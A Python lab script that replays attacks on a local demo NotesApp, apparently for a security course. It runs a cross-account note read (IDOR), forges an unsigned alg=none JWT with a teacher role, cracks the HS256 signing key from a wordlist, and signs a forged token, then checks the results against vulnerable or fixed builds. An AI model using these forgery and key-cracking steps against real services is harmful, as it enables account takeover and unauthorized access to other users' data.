"""Replay the Class 6 JWT forgery and the Class 8 cross-account read.

    python attack.py --base http://127.0.0.1:8090 --expect vulnerable

Runs the same seven steps against whichever NotesApp build is listening:

  1. log in as alice (student) and keep the bearer token the dashboard uses
  2. control  : alice reads her own note
  3. Class 8  : alice reads bob's note with her own, legitimate token
  4. Class 6  : forge an unsigned token ({"alg":"none"}) claiming role=teacher
  5. Class 6  : recover the HS256 signing key offline from alice's token
  6. Class 6  : sign a teacher token with the recovered key
  7. anonymous request

--expect decides how each step is graded, so the same script documents the
pre-fix behaviour (flaws present) and the repaired behaviour (flaws closed).

Standard library only.  No third-party packages, nothing to install.
"""
from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import http.cookiejar
import json
import os
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
WORDLIST = os.path.join(HERE, "wordlist.txt")

ALICE_NOTE = 1          # alice's own row
BOB_NOTE = 3            # bob's row: grade 12.6, "Solid work, keep it up."


# ---------------------------------------------------------------- helpers
def b64url(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode("ascii")


def b64url_json(obj: dict) -> str:
    return b64url(json.dumps(obj, separators=(",", ":")).encode())


def decode_part(part: str) -> dict:
    return json.loads(base64.urlsafe_b64decode(part + "=" * (-len(part) % 4)))


def sign(secret: str, signing_input: str) -> str:
    return b64url(hmac.new(secret.encode(), signing_input.encode(),
                           hashlib.sha256).digest())


class Client:
    def __init__(self, base: str):
        self.base = base.rstrip("/")
        self.jar = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self.jar))

    def get(self, path: str, token: str | None = None):
        req = urllib.request.Request(self.base + path)
        if token:
            req.add_header("Authorization", "Bearer " + token)
        return self._send(req)

    def post_form(self, path: str, fields: dict):
        data = urllib.parse.urlencode(fields).encode()
        req = urllib.request.Request(self.base + path, data=data, method="POST")
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
        return self._send(req)

    def _send(self, req):
        try:
            with self.opener.open(req, timeout=15) as resp:
                return resp.status, resp.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as exc:
            return exc.code, exc.read().decode("utf-8", "replace")


def brief(body: str, limit: int = 220) -> str:
    """Collapse a JSON body to one readable line."""
    text = " ".join(body.split())
    try:
        obj = json.loads(text)
        if isinstance(obj, dict):
            keep = {k: obj[k] for k in ("id", "student", "grade", "comment", "error")
                    if k in obj}
            text = json.dumps(keep, ensure_ascii=False)
    except json.JSONDecodeError:
        pass
    return text if len(text) <= limit else text[:limit] + "..."


def rule(char: str = "=") -> str:
    return char * 68


# ---------------------------------------------------------------- the run
def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", required=True, help="http://127.0.0.1:PORT")
    ap.add_argument("--expect", choices=["vulnerable", "fixed"], required=True)
    ap.add_argument("--user", default="alice")
    ap.add_argument("--password", default="alicepw")
    a = ap.parse_args()

    c = Client(a.base)
    observed: dict[str, int | bool | str] = {}

    print(rule())
    print("NotesApp login attack replay -- Class 6 (flaw #4), Class 8 (flaw #7)")
    print(f"target : {c.base}")
    print(f"expect : {a.expect} build")
    print(f"run at : {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print(rule())

    # ---- 1. log in ----------------------------------------------------
    print(f"\n[1] login: {a.user} / {a.password}")
    st, body = c.post_form("/login", {"username": a.user, "password": a.password})
    st_dash, dash = c.get("/dashboard")
    m = re.search(r'const TOKEN = "([^"]+)"', dash)
    if not m:
        print(f"    login page HTTP {st}; dashboard HTTP {st_dash}")
        print("    no bearer token in the dashboard -- cannot continue")
        return 1
    token = m.group(1)
    head, payload, sig = token.split(".")
    print(f"    HTTP {st} -- session established, bearer token issued")
    print(f"    header : {json.dumps(decode_part(head))}")
    print(f"    claims : {json.dumps(decode_part(payload))}")
    print(f"    token  : {token[:58]}...")

    # ---- 2. control: own note ----------------------------------------
    print(f"\n[2] control: alice reads her own note (id {ALICE_NOTE})")
    st, body = c.get(f"/api/notes/{ALICE_NOTE}", token)
    observed["own"] = st
    print(f"    HTTP {st}")
    print(f"    {brief(body)}")

    # ---- 3. Class 8: cross-account read -------------------------------
    print(f"\n[3] Class 8: alice reads bob's note (id {BOB_NOTE}) "
          f"with her own legitimate token")
    st, body = c.get(f"/api/notes/{BOB_NOTE}", token)
    observed["foreign"] = st
    print(f"    HTTP {st}")
    print(f"    {brief(body)}")

    # ---- 4. Class 6 part 1: unsigned token ----------------------------
    print("\n[4] Class 6 part 1: forge an unsigned token, claims role=teacher")
    forged_none = (f'{b64url_json({"alg": "none", "typ": "JWT"})}.'
                   f'{b64url_json({"user_id": 6, "role": "teacher"})}.')
    print(f"    token  : {forged_none}")
    st, body = c.get(f"/api/notes/{BOB_NOTE}", forged_none)
    observed["none"] = st
    print(f"    HTTP {st}")
    print(f"    {brief(body)}")

    # ---- 5. Class 6 part 2: crack the key -----------------------------
    print("\n[5] Class 6 part 2: recover the HS256 signing key offline")
    candidates = [w.strip() for w in open(WORDLIST, encoding="utf-8") if w.strip()]
    signing_input = f"{head}.{payload}"
    t0 = time.perf_counter()
    cracked, position = None, 0
    for i, word in enumerate(candidates, 1):
        if hmac.compare_digest(sign(word, signing_input), sig):
            cracked, position = word, i
            break
    elapsed = (time.perf_counter() - t0) * 1000
    print(f"    target   : the token above ({len(token)} chars)")
    print(f"    wordlist : {len(candidates)} candidate keys")
    print(f"    work     : HMAC-SHA256 per candidate, {len(signing_input)} bytes of input")
    if cracked:
        print(f"    result   : CRACKED -- key is {cracked!r} "
              f"(candidate #{position}, {elapsed:.2f} ms)")
        observed["cracked"] = True
    else:
        print(f"    result   : NOT CRACKED after {len(candidates)} candidates "
              f"({elapsed:.2f} ms)")
        observed["cracked"] = False

    # ---- 6. Class 6 part 2: signed forgery ----------------------------
    print("\n[6] Class 6 part 2: sign a teacher token and read bob's note")
    if cracked:
        forged_signed = (f'{b64url_json({"alg": "HS256", "typ": "JWT"})}.'
                         f'{b64url_json({"user_id": 6, "role": "teacher"})}')
        forged_signed += "." + sign(cracked, forged_signed)
        note = f"    token  : {forged_signed[:58]}..."
    else:
        # keep the run honest: sign with the value the course material used
        forged_signed = (f'{b64url_json({"alg": "HS256", "typ": "JWT"})}.'
                         f'{b64url_json({"user_id": 6, "role": "teacher"})}')
        forged_signed += "." + sign("s3cr3t", forged_signed)
        note = "    token  : signed with the old course key 's3cr3t' (key not recovered here)"
    print(note)
    st, body = c.get(f"/api/notes/{BOB_NOTE}", forged_signed)
    observed["signed"] = st
    print(f"    HTTP {st}")
    print(f"    {brief(body)}")

    # ---- 7. anonymous -------------------------------------------------
    print(f"\n[7] anonymous request for note {BOB_NOTE}")
    anon = Client(a.base)          # fresh cookie jar: no session, no bearer
    st, body = anon.get(f"/api/notes/{BOB_NOTE}")
    observed["anon"] = st
    print(f"    HTTP {st}")
    print(f"    {brief(body)}")

    # ---- verdict ------------------------------------------------------
    expect = {
        "vulnerable": {"own": 200, "foreign": 200, "none": 200,
                       "cracked": True, "signed": 200, "anon": 401},
        "fixed": {"own": 200, "foreign": 404, "none": 401,
                  "cracked": False, "signed": 401, "anon": 401},
    }[a.expect]

    print("\n" + rule("-"))
    print(f"expected for a {a.expect.upper()} build:")
    rows = [
        ("alice reads her own note", "own", 200),
        ("alice reads bob's note (IDOR)", "foreign", expect["foreign"]),
        ("unsigned forgeable token", "none", expect["none"]),
        ("signing key recovered", "cracked", expect["cracked"]),
        ("teacher token signed with it", "signed", expect["signed"]),
        ("anonymous request", "anon", 401),
    ]
    ok = True
    for label, key, want in rows:
        got = observed.get(key)
        match = got == want
        ok = ok and match
        shown = "yes" if got is True else "no" if got is False else str(got)
        print(f"  {'MATCH' if match else 'DIFF ':5}  {label:<32} observed {shown:<5} "
              f"expected {want}")
    print(rule("-"))
    print("VERDICT: " + ("matches the expected behaviour for this build"
                         if ok else "does NOT match the expected behaviour"))
    return 0 if ok else 2


if __name__ == "__main__":
    raise SystemExit(main())
